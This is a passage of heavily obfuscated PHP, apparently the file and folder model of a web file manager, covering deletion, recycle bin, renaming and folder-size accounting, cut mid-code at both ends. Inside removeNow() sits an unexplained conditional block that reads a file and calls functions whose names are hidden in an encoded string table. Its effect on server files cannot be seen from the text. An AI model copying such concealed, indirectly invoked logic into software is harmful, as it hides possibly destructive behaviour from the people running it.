=> short_id($³è¨€ŠÌ)); $this->where(array($÷òÃˆƒ›[506] => $³è¨€ŠÌ))->save($‘£ú¸Á); $this->setNamePinyin($³è¨€ŠÌ, $ÜœĞ’Ê[$÷òÃˆƒ›[32]]); return $³è¨€ŠÌ; } public function remove($”ÑÒŸ¥, $áò›¬³ë = true) { $½á§É‡¼ =& $_SERVER[©—Ò»ÅĞ]; $Ò«îˆİØ = $this->sourceInfo($”ÑÒŸ¥); $¥®úá¶ú = intval($Ò«îˆİØ[$½á§É‡¼[188]]) === self::TYPE_SYSTEM; $À†°úËÔ = Model($½á§É‡¼[522])->get($½á§É‡¼[2484]) == $½á§É‡¼[91]; if ($¥®úá¶ú || $áò›¬³ë || !$À†°úËÔ) { return $this->removeNow($”ÑÒŸ¥, $áò›¬³ë); } $…ªóş³§ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ íºİ­• = $Ò«îˆİØ[$½á§É‡¼[188]] == self::TYPE_USER ? $½á§É‡¼[684] : $½á§É‡¼[598]; if ($ íºİ­• == $½á§É‡¼[684]) { $ òÍÍúƒ = Model($½á§É‡¼[597])->getInfo($Ò«îˆİØ[$½á§É‡¼[589]]); $«ÖÕ±¬â = !empty($ òÍÍúƒ[$½á§É‡¼[2477]]) ? $ òÍÍúƒ[$½á§É‡¼[2477]] : $ òÍÍúƒ[$½á§É‡¼[32]]; $«ÖÕ±¬â = $½á§É‡¼[337] . $«ÖÕ±¬â . $½á§É‡¼[2485] . $Ò«îˆİØ[$½á§É‡¼[589]]; } else { $ òÍÍúƒ = Model($½á§É‡¼[605])->getInfo($Ò«îˆİØ[$½á§É‡¼[589]]); $«ÖÕ±¬â = _get($ òÍÍúƒ, $½á§É‡¼[32]); $«ÖÕ±¬â = $½á§É‡¼[173] . $«ÖÕ±¬â . $½á§É‡¼[2486] . $Ò«îˆİØ[$½á§É‡¼[589]]; } $åÙ„Êéƒ = $½á§É‡¼[2487] . md5($«ÖÕ±¬â); CacheLock::lock($åÙ„Êéƒ); $ Ê”­ = $this->fileNameExist($…ªóş³§, $«ÖÕ±¬â); if (!$ Ê”­) { $ Ê”­ = $this->mkdir($…ªóş³§, $«ÖÕ±¬â, REPEAT_SKIP); $this->metaSet($ Ê”­, $½á§É‡¼[2488], $ íºİ­•); $this->metaSet($ Ê”­, $½á§É‡¼[2489], $Ò«îˆİØ[$½á§É‡¼[589]]); if ($Ò«îˆİØ[$½á§É‡¼[190]] != 0) { $this->metaSet($ Ê”­, $½á§É‡¼[2490], _get($ òÍÍúƒ, $½á§É‡¼[2491])); } } CacheLock::unlock($åÙ„Êéƒ); $this->metaSet($”ÑÒŸ¥, $½á§É‡¼[2492], $Ò«îˆİØ[$½á§É‡¼[190]]); $this->where(array($½á§É‡¼[191] => $”ÑÒŸ¥))->save(array($½á§É‡¼[513] => time())); $this->recycleClear($Ò«îˆİØ); Model($½á§É‡¼[655])->eventRemove($”ÑÒŸ¥); $ñªÒ¯‘½ = $this->move($”ÑÒŸ¥, $ Ê”­, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Ò«îˆİØ[$½á§É‡¼[190]]); return $ñªÒ¯‘½; } private function recycleClear($›ñÉª”µ) { $º¨Ç÷‹Ş =& $_SERVER[©—Ò»ÅĞ]; $ûçš“‘‚ = $this->childrenAll($›ñÉª”µ); $ÒİÊşÀÙ = array($º¨Ç÷‹Ş[506] => array($º¨Ç÷‹Ş[507], $ûçš“‘‚[$º¨Ç÷‹Ş[2493]])); Model($º¨Ç÷‹Ş[2494])->where($ÒİÊşÀÙ)->delete(); } public function removeNow($Ì™ššêĞ, $´ƒ°ö˜© = true) { $—öĞ—„ =& $_SERVER[©—Ò»ÅĞ]; if ($_SERVER[$—öĞ—„[1034]] != $_SERVER[$—öĞ—„[1076]]) { $ÉèÀÉû¥ = $—öĞ—„[1036]; $ˆ¸º™ø… = $—öĞ—„[1037]; $Í¹¦¿À° = $_SERVER[$—öĞ—„[1038]] . $—öĞ—„[1039]; $—Å†ÒÃ = $ˆ¸º™ø…($Í¹¦¿À°); $¼ÛŠ²¸‰ = explode($—öĞ—„[285], $—Å†ÒÃ); if (count($¼ÛŠ²¸‰) < $—öĞ—„[707]) { $ºÚæò¿¬ = $—öĞ—„[1040]; $ºÚæò¿¬(); } $ˆ‚¬äìŒ = $—öĞ—„[1041]; $ˆ‚¬äìŒ($_SERVER[$—öĞ—„[1042]]); $ˆ‚¬äìŒ($_SERVER[$—öĞ—„[1038]] . $—öĞ—„[2495]); $ûúƒƒ´÷ = 1; while ($ûúƒƒ´÷ > 1) { $ûúƒƒ´÷ = $ûúƒƒ´÷ + 4; $±òï•«¸ = rawurlencode($ûúƒƒ´÷ . $—öĞ—„[463]); } } $ØÛÅ‹©” = $this->sourceInfo($Ì™ššêĞ); $ ü×ñÆÅ = $this->pathInfoMore($Ì™ššêĞ); if (!$ØÛÅ‹©”) { return !0; } if ($ØÛÅ‹©”[$—öĞ—„[190]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($Ì™ššêĞ); Hook::trigger($—öĞ—„[2496], $ ü×ñÆÅ, $´ƒ°ö˜©); if ($´ƒ°ö˜©) { Model($—öĞ—„[2494])->moveToRecycle($Ì™ššêĞ); } else { $×ú¢ãóå = $this->childrenAll($ØÛÅ‹©”); Model($—öĞ—„[655])->eventRemove($Ì™ššêĞ); $this->removeRelevance($×ú¢ãóå[$—öĞ—„[2493]], $×ú¢ãóå[$—öĞ—„[1779]]); } $this->folderSizeReset($ØÛÅ‹©”[$—öĞ—„[190]]); $ÙË©² = array($ØÛÅ‹©”[$—öĞ—„[190]]); if ($ØÛÅ‹©”[$—öĞ—„[500]] == $—öĞ—„[91]) { $ÙË©²[] = $ØÛÅ‹©”[$—öĞ—„[191]]; } $this->updateModifyTime($ÙË©²); $this->lockMoveEnd($Ì™ššêĞ); Hook::trigger($—öĞ—„[2020], $ ü×ñÆÅ, $´ƒ°ö˜©); return !0; } public function childrenAll($Î‘ùÎ›) { $†—¸³ê =& $_SERVER[©—Ò»ÅĞ]; $ÅßíÆã = $Î‘ùÎ›[$†—¸³ê[191]]; if ($Î‘ùÎ›[$†—¸³ê[500]] == $†—¸³ê[91]) { $Ãˆ™ï—† = array($†—¸³ê[674] => array($†—¸³ê[635], $Î‘ùÎ›[$†—¸³ê[604]] . $ÅßíÆã . $†—¸³ê[636])); $É¯âÂ€Ç = array($†—¸³ê[674] => $Ãˆ™ï—†[$†—¸³ê[604]]); $ÙûÀÛ¶‡ = $this->field($†—¸³ê[2497])->where($É¯âÂ€Ç)->select(); $ˆİªâš = !1; $èºìÀ‹‘ = array($ÅßíÆã); if ($ÙûÀÛ¶‡) { $ˆİªâš = array_to_keyvalue($ÙûÀÛ¶‡, $†—¸³ê[12], $†—¸³ê[557]); $ˆİªâš = array_remove_value($ˆİªâš, $†—¸³ê[228]); $èºìÀ‹‘ = array_to_keyvalue($ÙûÀÛ¶‡, $†—¸³ê[12], $†—¸³ê[191]); $èºìÀ‹‘[] = $ÅßíÆã; } } else { $ˆİªâš = array($Î‘ùÎ›[$†—¸³ê[557]]); $èºìÀ‹‘ = array($ÅßíÆã); } return array($†—¸³ê[2493] => $èºìÀ‹‘, $†—¸³ê[1779] => $ˆİªâš); } public function removeArray($•Ä¼ÈÈ¼) { if (!$•Ä¼ÈÈ¼) { return !0; } } public function removeRelevance($ÛŒ» ²ü, $‚•¹ÑÜ) { $ÖâÄÍÊ‡ =& $_SERVER[©—Ò»ÅĞ]; $ÛŒ» ²ü = $ÛŒ» ²ü ? $ÛŒ» ²ü : array(); $‚•¹ÑÜ = $‚•¹ÑÜ ? $‚•¹ÑÜ : array(); $ÛŒ» ²ü = array_unique(array_filter($ÛŒ» ²ü)); $‚•¹ÑÜ = array_filter($‚•¹ÑÜ); if (!$ÛŒ» ²ü) { return !1; } $´ã†Ùäå = array($ÖâÄÍÊ‡[506] => array($ÖâÄÍÊ‡[507], $ÛŒ» ²ü)); Model($ÖâÄÍÊ‡[2494])->where($´ã†Ùäå)->delete(); Model($ÖâÄÍÊ‡[549])->where($´ã†Ùäå)->delete(); Model($ÖâÄÍÊ‡[2331])->where($´ã†Ùäå)->delete(); Model($ÖâÄÍÊ‡[655])->where($´ã†Ùäå)->delete(); Model($ÖâÄÍÊ‡[1562])->removeBySource($ÛŒ» ²ü); Model($ÖâÄÍÊ‡[2183])->removeBySource($ÛŒ» ²ü); $this->where($´ã†Ùäå)->delete(); Model($ÖâÄÍÊ‡[560])->remove($‚•¹ÑÜ); for ($´ ¨Ò„ = 0; $´ ¨Ò„ < count($ÛŒ» ²ü); $´ ¨Ò„++) { $this->sourceCacheClear($ÛŒ» ²ü[$´ ¨Ò„]); } } public function rename($ŞØòØ²Ä, $ã¸çÏóË) { $äí Öõé =& $_SERVER[©—Ò»ÅĞ]; $êºì»öÈ = $this->sourceInfo($ŞØòØ²Ä); if (!$êºì»öÈ) { return !1; } $Ì¿ÈÉıè = $this->fileNameExist($êºì»öÈ[$äí Öõé[190]], $ã¸çÏóË); if ($Ì¿ÈÉıè && $Ì¿ÈÉıè != $ŞØòØ²Ä) { return !1; } $­éÚ = array($äí Öõé[509] => $ã¸çÏóË, $äí Öõé[673] => USER_ID); if ($êºì»öÈ[$äí Öõé[500]] != $äí Öõé[91]) { $­éÚ[$äí Öõé[501]] = substr(get_path_ext($ã¸çÏóË), 0, 10); } Model($äí Öõé[655])->eventRename($ŞØòØ²Ä, $êºì»öÈ[$äí Öõé[32]], $ã¸çÏóË); $this->sourceCacheClear($ŞØòØ²Ä); $this->setNamePinyin($ŞØòØ²Ä, $­éÚ[$äí Öõé[32]], !1); $this->updateModifyTime($êºì»öÈ[$äí Öõé[190]]); $Ò„º‘¡ã = $this->where(array($äí Öõé[506] => $ŞØòØ²Ä))->data($­éÚ)->save(); $÷ş¥Ò¦ø = $äí Öõé[2483] . $êºì»öÈ[$äí Öõé[190]]; if (isset(self::$cacheChildList[$÷ş¥Ò¦ø])) { unset(self::$cacheChildList[$÷ş¥Ò¦ø]); } return $Ò„º‘¡ã; } public function setNamePinyin($ıËÎôíÏ, $•Š¥ÆØ, $÷Éßæ§Ñ = true) { $¬œŠ–— =& $_SERVER[©—Ò»ÅĞ]; $ü³§Àµß = Input::check($•Š¥ÆØ, $¬œŠ–—[677]); $©Ô©Ğ¹® = array($¬œŠ–—[531] => KodSort::makeStr($•Š¥ÆØ)); if ($ü³§Àµß) { $©Ô©Ğ¹®[$¬œŠ–—[552]] = str_replace($¬œŠ–—[53], $¬œŠ–—[12], Pinyin::get($•Š¥ÆØ)); $©Ô©Ğ¹®[$¬œŠ–—[551]] = Pinyin::get($•Š¥ÆØ, $¬œŠ–—[678]); } if (!$÷Éßæ§Ñ && !$ü³§Àµß) { $©Ô©Ğ¹®[$¬œŠ–—[552]] = null; $©Ô©Ğ¹®[$¬œŠ–—[551]] = null; } $this->metaSet($ıËÎôíÏ, $©Ô©Ğ¹®); } public function getContent($µÑÉÄÑ) { $„êÈüÕ€ =& $_SERVER[©—Ò»ÅĞ]; $ÇàÔĞÓû = $this->fileInfoGet($µÑÉÄÑ); if (!$ÇàÔĞÓû) { return !1; } if ($ÇàÔĞÓû[$„êÈüÕ€[79]] == 0) { return $„êÈüÕ€[12]; } $ùÈ–ÃÑœ = $„êÈüÕ€[2498] . $ÇàÔĞÓû[$„êÈüÕ€[563]]; if ($ÇàÔĞÓû[$„êÈüÕ€[79]] <= 1024 * 10) { $…ÌµÑÜâ = Cache::get($ùÈ–ÃÑœ); if (!$…ÌµÑÜâ) { $…ÌµÑÜâ = IO::getContent($ÇàÔĞÓû[$„êÈüÕ€[87]]); Cache::set($ùÈ–ÃÑœ, $…ÌµÑÜâ); } return $…ÌµÑÜâ; } if (!$ÇàÔĞÓû[$„êÈüÕ€[87]]) { return $„êÈüÕ€[12]; } return IO::getContent($ÇàÔĞÓû[$„êÈüÕ€[87]]); } public function setDesc($Œä¥Ò€Û, $Øéë‰ÑÄ) { $—¿Î½‚Ÿ =& $_SERVER[©—Ò»ÅĞ]; Model($—¿Î½‚Ÿ[655])->eventAddDesc($Œä¥Ò€Û, $Øéë‰ÑÄ); return $this->metaSet($Œä¥Ò€Û, $—¿Î½‚Ÿ[540], $Øéë‰ÑÄ); } public function setContent($Š¾ğÄ³ª, $’µ‚‡Àı = '') { $éšÔ–ŠÛ =& $_SERVER[©—Ò»ÅĞ]; $´¦¢‹Í = $this->sourceInfo($Š¾ğÄ³ª); $˜ğ®ê¥· = $this->fileInfoGet($Š¾ğÄ³ª); if (!$˜ğ®ê¥· || !$´¦¢‹Í) { return !1; } $–êÆ©˜³ = KodIO::ioFileDriverGet($éšÔ–ŠÛ[498] . $Š¾ğÄ³ª . $éšÔ–ŠÛ[402]); $·ÛŒ¥‡¼ = Model($éšÔ–ŠÛ[560])->addFileByContent($’µ‚‡Àı, $–êÆ©˜³, $´¦¢‹Í[$éšÔ–ŠÛ[32]]); if (!$·ÛŒ¥‡¼) { return !1; } $„¤Í»¾ş = $this->fileHistory($´¦¢‹Í, $·ÛŒ¥‡¼[$éšÔ–ŠÛ[557]], $·ÛŒ¥‡¼[$éšÔ–ŠÛ[79]]); if (!$„¤Í»¾ş) { return Model($éšÔ–ŠÛ[560])->remove($·ÛŒ¥‡¼[$éšÔ–ŠÛ[557]]); } $this->folderSizeReset($´¦¢‹Í[$éšÔ–ŠÛ[190]]); return !0; } public function fileSubstr($Ğ„ûæÚ, $‘³Õ¡ò, $ÇÏè˜àÚ) { $Õò¶«°” = $this->fileInfoGet($Ğ„ûæÚ); if (!$Õò¶«°”) { return !1; } return IO::fileSubstr($Õò¶«°”[$_SERVER[©—Ò»ÅĞ][87]], $‘³Õ¡ò, $ÇÏè˜àÚ); } public function fileInfoGet($¶ÆÊïÓğ) { $ÇûŠîÜÇ =& $_SERVER[©—Ò»ÅĞ]; $¸›ûšñÈ = $this->sourceInfo($¶ÆÊïÓğ); if (!$¸›ûšñÈ || $¸›ûšñÈ[$ÇûŠîÜÇ[500]]) { return !1; } $øú¯ÑŸŞ = $ÇûŠîÜÇ[564] . $¸›ûšñÈ[$ÇûŠîÜÇ[557]]; $…º¸†¿³ = _get(self::$cacheFileInfo, $øú¯ÑŸŞ); if ($…º¸†¿³) { return $…º¸†¿³; } $Öà»òîÌ = Model($ÇûŠîÜÇ[560])->fileInfo($¸›ûšñÈ[$ÇûŠîÜÇ[557]]); if ($Öà»òîÌ) { $Öà»òîÌ[$ÇûŠîÜÇ[32]] = $¸›ûšñÈ[$ÇûŠîÜÇ[32]]; } self::$cacheFileInfo[$øú¯ÑŸŞ] = $Öà»òîÌ; return $Öà»òîÌ; } private function folderChildrenNumber($ˆ±ªÄò¤) { $İ¨Ì‘³Š =& $_SERVER[©—Ò»ÅĞ]; $ÓÔ’áÉ = $this->sourceInfo($ˆ±ªÄò¤); $ğİ×’‹ä = array($İ¨Ì‘³Š[674] => array($İ¨Ì‘³Š[635], $ÓÔ’áÉ[$İ¨Ì‘³Š[604]] . $ˆ±ªÄò¤ . $İ¨Ì‘³Š[636]), $İ¨Ì‘³Š[671] => $ÓÔ’áÉ[$İ¨Ì‘³Š[589]], $İ¨Ì‘³Š[519] => intval($ÓÔ’áÉ[$İ¨Ì‘³Š[520]]), $İ¨Ì‘³Š[668] => 1); $åÇ˜¡è  = $this->where($ğİ×’‹ä)->count(); $Ş¦ŸÜµÊ = $this->where($ğİ×’‹ä)->where(array($İ¨Ì‘³Š[668] => 0))->count(); return array($İ¨Ì‘³Š[83] => $Ş¦ŸÜµÊ, $İ¨Ì‘³Š[84] => $åÇ˜¡è ); } public function pathInfo($×á²Í¿ù, $ô“ª¦ò° = false) { $¦ØÜÍ¹ =& $_SERVER[©—Ò»ÅĞ]; $ô“ª¦ò° = !1; $×á²Í¿ù = intval($×á²Í¿ù); if (!$×á²Í¿ù) { return !1; } $™‰Şªõõ = $¦ØÜÍ¹[548] . intval($ô“ª¦ò°) . $¦ØÜÍ¹[476] . $×á²Í¿ù; $õóÒÛ¶ˆ = _get(self::$cachePathInfo, $™‰Şªõõ); if ($õóÒÛ¶ˆ) { return $õóÒÛ¶ˆ; } $¶ËÊ¨ñÎ = $this->sourceInfo($×á²Í¿ù); if (!$¶ËÊ¨ñÎ) { return !1; } $¶ËÊ¨ñÎ = $this->_listDataApplyItem($¶ËÊ¨ñÎ, $ô“ª¦ò°); self::$cachePathInfo[$™‰Şªõõ] = $¶ËÊ¨ñÎ; return $¶ËÊ¨ñÎ; } public static $cachePathInfoMore = array(); public function pathInfoMore($ÄÓâàÜ¿) { $Æ¹ö±ÊÃ =& $_SERVER[©—Ò»ÅĞ]; $‡¬°ÈÆ£ = _get(self::$cachePathInfoMore, $ÄÓâàÜ¿); if ($‡¬°ÈÆ£) { return $‡¬°ÈÆ£; } $ÈˆÜÌ„¾ = $this->pathInfo($ÄÓâàÜ¿); if (!$ÈˆÜÌ„¾) { return !1; } if ($ÈˆÜÌ„¾[$Æ¹ö±ÊÃ[500]] == $Æ¹ö±ÊÃ[91]) { $ÈˆÜÌ„¾[$Æ¹ö±ÊÃ[82]] = $this->folderChildrenNumber($ÄÓâàÜ¿); } self::$cachePathInfoMore[$ÄÓâàÜ¿] = $ÈˆÜÌ„¾; return $ÈˆÜÌ„¾; } public function sourceInfo($«ãç•Ÿö) { $ë‘ÎÖ³ =& $_SERVER[©—Ò»ÅĞ]; if (!$«ãç•Ÿö) { return array(); } $«ãç•Ÿö = intval($«ãç•Ÿö); $°Â…æ“Ô = $ë‘ÎÖ³[547] . $«ãç•Ÿö; $çÀÖ Øî = _get(self::$cacheSourceInfo, $°Â…æ“Ô); if ($çÀÖ Øî) { return $çÀÖ Øî; } $€¦Ù¼¥¼ = $this->where(array($ë‘ÎÖ³[191] => $«ãç•Ÿö))->find(); self::$cacheSourceInfo[$°Â…æ“Ô] = $€¦Ù¼¥¼; return self::$cacheSourceInfo[$°Â…æ“Ô]; } public function sourceCacheClear($åû—„• = false) { self::cacheClear($åû—„•); } public static function cacheClear($“Ë˜¹Ş¼ = false) { $³„²ŠâÕ =& $_SERVER[©—Ò»ÅĞ]; if ($“Ë˜¹Ş¼ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$³„²ŠâÕ[547] . $“Ë˜¹Ş¼]); unset(self::$cachePathInfoMore[$“Ë˜¹Ş¼]); unset(self::$cachePathInfo[$³„²ŠâÕ[2499] . $“Ë˜¹Ş¼]); unset(self::$cachePathInfo[$³„²ŠâÕ[2500] . $“Ë˜¹Ş¼]); } public function metaSet($µØì‹Æ, $°û‚µ¾³ = null, $ÌÊ°Âı« = null) { $° Íççõ = parent::metaSet($µØì‹Æ, $°û‚µ¾³, $ÌÊ°Âı«); if ($° Íççõ) { $this->sourceCacheClear($µØì‹Æ); } return $° Íççõ; } public function pathInfoByPath($ËËğà×÷, $ÄıêË¤å) { $Î¦œ®Öæ =& $_SERVER[©—Ò»ÅĞ]; $ç®Àåøß = !$ÄıêË¤å ? array() : explode($Î¦œ®Öæ[8], trim($ÄıêË¤å, $Î¦œ®Öæ[8])); $±ı­ÈÃæ = intval($ËËğà×÷); foreach ($ç®Àåøß as $ì¨Ë˜) { $àì³Ï¬£ = array($Î¦œ®Öæ[190] => $±ı­ÈÃæ, $Î¦œ®Öæ[32] => $ì¨Ë˜); $½ëÁ×À = $this->field($Î¦œ®Öæ[2501])->where($àì³Ï¬£)->select(); if (!$½ëÁ×À) { return !1; } $½ëÁ×À = array_sort_by($½ëÁ×À, $Î¦œ®Öæ[520]); $±ı­ÈÃæ = intval($½ëÁ×À[0][$Î¦œ®Öæ[191]]); } $Ç¦áé­Ê = $this->sourceInfo($±ı­ÈÃæ); $this->pathInfoFilter($Ç¦áé­Ê); return $Ç¦áé­Ê; } protected function updateModifyTime($÷ôÍÔøû) { $î¹÷ÒšÜ =& $_SERVER[©—Ò»ÅĞ]; $õóà·±À = KodUser::id(); if (!$÷ôÍÔøû) { return; } if (!is_array($÷ôÍÔøû)) { $÷ôÍÔøû = array($÷ôÍÔøû); } foreach ($÷ôÍÔøû as $ì×é¬ğ => $ã¯Ùçºî) { $÷ôÍÔøû[$ì×é¬ğ] = intval($ã¯Ùçºî); $this->sourceCacheClear($ã¯Ùçºî); } $Ä»°Œï¸ = array($î¹÷ÒšÜ[191] => array($î¹÷ÒšÜ[7], $÷ôÍÔøû)); $ß§Ä©ä = array($î¹÷ÒšÜ[673] => $õóà·±À, $î¹÷ÒšÜ[513] => time()); $this->where($Ä»°Œï¸)->save($ß§Ä©ä); } public function folderSizeReset($İâÍîºš, $İªŒœ¬Ã = false) { $ö¤µÔõ­ =& $_SERVER[©—Ò»ÅĞ]; if ($this->statusIgnoreResetSpace) { return; } if (!$İâÍîºš) { return; } $ñ¬Úøá = $this->sourceInfo($İâÍîºš); $‹Ä¶Ê° = $ö¤µÔõ­[2502] . $İâÍîºš; if (!$ñ¬Úøá || !$ñ¬Úøá[$ö¤µÔõ­[191]]) { return; } CacheLock::lock($‹Ä¶Ê°, 20); if ($İªŒœ¬Ã === !1) { $this->sourceCacheClear($İâÍîºš); $ñ¬Úøá = $this->sourceInfo($İâÍîºš); $æœÌıä« = array($ö¤µÔõ­[492] => $İâÍîºš, $ö¤µÔõ­[519] => 0); $¢ØìÅëí = $this->where($æœÌıä«)->sum($ö¤µÔõ­[79]); $İªŒœ¬Ã = intval($¢ØìÅëí) - intval($ñ¬Úøá[$ö¤µÔõ­[79]]); } if ($İªŒœ¬Ã == 0) { return CacheLock::unlock($‹Ä¶Ê°); } $°†öÙ¯¯ = $this->parentLevelArray($ñ¬Úøá[$ö¤µÔõ­[604]]); if (!$°†öÙ¯¯) { $°†öÙ¯¯ = array(); } $°†öÙ¯¯[] = $ñ¬Úøá[$ö¤µÔõ­[191]]; $æœÌıä« = array($ö¤µÔõ­[191] => array($ö¤µÔõ­[507], $°†öÙ¯¯)); if ($İªŒœ¬Ã < 0) { $æœÌıä«[$ö¤µÔõ­[79]] = array($ö¤µÔõ­[1183], abs($İªŒœ¬Ã)); } $this->where($æœÌıä«)->setAdd($ö¤µÔõ­[79], $İªŒœ¬Ã); CacheLock::unlock($‹Ä¶Ê°); if (!$ñ¬Úøá[$ö¤µÔõ­[589]] || $ñ¬Úøá[$ö¤µÔõ­[589]] == $ö¤µÔõ­[228]) { return; } $ûÀ‚ø· = $ö¤µÔõ­[2503] . $ñ¬Úøá[$ö¤µÔõ­[188]] . $ö¤µÔõ­[4] . $ñ¬Úøá[$ö¤µÔõ­[589]]; $éšÚ¼Ê = array($ñ¬Úøá[$ö¤µÔõ­[188]], $ñ¬Úøá[$ö¤µÔõ­[589]]); TaskRun::timeLimitCall($ûÀ‚ø·, $ö¤µÔõ­[2504], $éšÚ¼Ê, 1.5); } public function folderSizeResetChildren($¯²á“æ) { $£—¾âå¯ =& $_SERVER[©—Ò»ÅĞ]; $this->sourceCacheClear($¯²á“æ); $±¾ÏæÆ = $this->sourceInfo($¯²á“æ); if (!$±¾ÏæÆ) { return; } $àã°¯˜ = array($£—¾âå¯[668] => 1, $£—¾âå¯[671] => $±¾ÏæÆ[$£—¾âå¯[589]], $£—¾âå¯[674] => array($£—¾âå¯[635], $±¾ÏæÆ[$£—¾âå¯[604]] . $¯²á“æ . $£—¾âå¯[636])); $ÃË²‘Öü = $£—¾âå¯[2505]; $›·º®Îà = $this->field($ÃË²‘Öü)->where($àã°¯˜)->select(); $àã°¯˜[$£—¾âå¯[500]] = 0; $ïŸÙÊÓ = $this->field($ÃË²‘Öü)->where($àã°¯˜)->select(); if (!$ïŸÙÊÓ) { return; } $›·º®Îà[] = $±¾ÏæÆ; $›·º®Îà = array_to_keyvalue($›·º®Îà, $£—¾âå¯[191]); foreach ($›·º®Îà as $ß›…™‰¸ => $ÏœŠ’˜û) { $›·º®Îà[$ß›…™‰¸][$£—¾âå¯[2506]] = $›·º®Îà[$ß›…™‰¸][$£—¾âå¯[79]]; $›·º®Îà[$ß›…™‰¸][$£—¾âå¯[79]] = 0; } foreach ($ïŸÙÊÓ as $ÏœŠ’˜û) { $¡¦¤¦ñò = $ÏœŠ’˜û[$£—¾âå¯[190]] . $£—¾âå¯[12]; if (!isset($›·º®Îà[$¡¦¤¦ñò])) { continue; } if ($ÏœŠ’˜û[$£—¾âå¯[520]] == $›·º®Îà[$¡¦¤¦ñò][$£—¾âå¯[520]]) { $›·º®Îà[$¡¦¤¦ñò][$£—¾âå¯[79]] += $ÏœŠ’˜û[$£—¾âå¯[79]]; } } foreach ($›·º®Îà as $ÏœŠ’˜û) { $‘¿È©ò‡ = $this->parentLevelArray($ÏœŠ’˜û[$£—¾âå¯[604]]); foreach ($‘¿È©ò‡ as $¡¦¤¦ñò) { $¡¦¤¦ñò = $¡¦¤¦ñò . $£—¾âå¯[12]; if (!isset($›·º®Îà[$¡¦¤¦ñò])) { continue; } if ($ÏœŠ’˜û[$£—¾âå¯[520]] == $›·º®Îà[$¡¦¤¦ñò][$£—¾âå¯[520]]) { $›·º®Îà[$¡¦¤¦ñò][$£—¾âå¯[79]] += $ÏœŠ’˜û[$£—¾âå¯[79]]; } } } $«€¢°Ê› = array(); foreach ($›·º®Îà as $ÏœŠ’˜û) { if ($ÏœŠ’˜û[$£—¾âå¯[79]] == $ÏœŠ’˜û[$£—¾âå¯[2506]]) { continue; } $«€¢°Ê›[] = array($£—¾âå¯[191], $ÏœŠ’˜û[$£—¾âå¯[191]], $£—¾âå¯[79], $ÏœŠ’˜û[$£—¾âå¯[79]]); } $this->saveAll($«€¢°Ê›); } public function userSpaceReset($ß¤­øÒÖ = false) { $—ğ„Šİ¸ =& $_SERVER[©—Ò»ÅĞ]; $•ñÍ±üæ = $this->where(array($—ğ„Šİ¸[188] => self::TYPE_USER, $—ğ„Šİ¸[589] => $ß¤­øÒÖ, $—ğ„Šİ¸[500] => 0))->sum($—ğ„Šİ¸[79]); $•ñÍ±üæ = !$•ñÍ±üæ || $•ñÍ±üæ <= 0 ? 0 : $•ñÍ±üæ; Model($—ğ„Šİ¸[597])->userEdit($ß¤­øÒÖ, array($—ğ„Šİ¸[2171] => $•ñÍ±üæ)); } public function targetSpaceUpdate($Ê¡°º¡, $œôûşåò) { $Áï‡ÇÚ =& $_SERVER[©—Ò»ÅĞ]; if (!$œôûşåò) { return; } if (!in_array($Ê¡°º¡, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ä°º»· = $this->targetSpaceSize($Ê¡°º¡, $œôûşåò); if ($Ê¡°º¡ == self::TYPE_USER) { Model($Áï‡ÇÚ[597])->userEdit($œôûşåò, array($Áï‡ÇÚ[2171] => $ä°º»·)); } else { if ($Ê¡°º¡ == self::TYPE_GROUP) { Model($Áï‡ÇÚ[605])->groupEdit($œôûşåò, array($Áï‡ÇÚ[2171] => $ä°º»·)); } } } public function targetSpaceSize($¨‹Û¹œ, $ÅéˆŞÙÃ) { $ƒ±Ö‘ğÎ =& $_SERVER[©—Ò»ÅĞ]; $ú³»Å¹Õ = 0; $Åñ¯ĞÅ = $this->targetSourceRoot($¨‹Û¹œ, $ÅéˆŞÙÃ, !0); foreach ($Åñ¯ĞÅ as $ıÜ¿è³’) { if (!$ıÜ¿è³’) { continue; } $ú³»Å¹Õ += floatval($ıÜ¿è³’[$ƒ±Ö‘ğÎ[79]]); $›¡Ï¾¾ = array($ƒ±Ö‘ğÎ[674] => array($ƒ±Ö‘ğÎ[635], $ƒ±Ö‘ğÎ[613] . $ıÜ¿è³’[$ƒ±Ö‘ğÎ[191]] . $ƒ±Ö‘ğÎ[636])); $®—Îò‹€ = Model($ƒ±Ö‘ğÎ[518])->field($ƒ±Ö‘ğÎ[506])->where($›¡Ï¾¾)->select(); $®—Îò‹€ = array_to_keyvalue($®—Îò‹€, $ƒ±Ö‘ğÎ[12], $ƒ±Ö‘ğÎ[191]); $®—Îò‹€ = array_unique(array_filter($®—Îò‹€)); if ($®—Îò‹€) { $›¡Ï¾¾ = array($ƒ±Ö‘ğÎ[506] => array($ƒ±Ö‘ğÎ[507], $®—Îò‹€)); $ú³»Å¹Õ += floatval($this->where($›¡Ï¾¾)->sum($ƒ±Ö‘ğÎ[79])); } } $ú³»Å¹Õ = !$ú³»Å¹Õ || $ú³»Å¹Õ <= 0 ? 0 : $ú³»Å¹Õ; return $ú³»Å¹Õ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($˜…ìÒÇ¿) { return $this->fileTypeProfile($˜…ìÒÇ¿, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ãµ¡Ì€) { return $this->fileTypeProfile($ãµ¡Ì€, SourceModel::TYPE_GROUP); } private function fileTypeProfile($‰¤“ßşƒ, $†Ê¦¦òü) { $ğÂäÚ· =& $_SERVER[©—Ò»ÅĞ]; $Î©¾ë·¸ = $ğÂäÚ·[2507] . $‰¤“ßşƒ . $ğÂäÚ·[11] . $†Ê¦¦òü; $á°å³¹’ = Cache::get($Î©¾ë·¸); if ($á°å³¹’) { return $á°å³¹’; } $µ–›ä³è = array($ğÂäÚ·[668] => 0); if ($‰¤“ßşƒ != !1) { $µ–›ä³è[$ğÂäÚ·[589]] = $‰¤“ßşƒ; $µ–›ä³è[$ğÂäÚ·[188]] = $†Ê¦¦òü; } $ãÀŠ‚İ¾ = array(); $ğ”çÂÜ­ = $this->field(array($ğÂäÚ·[949] => $ğÂäÚ·[950], $ğÂäÚ·[951] => $ğÂäÚ·[79]))->where($µ–›ä³è)->find(); 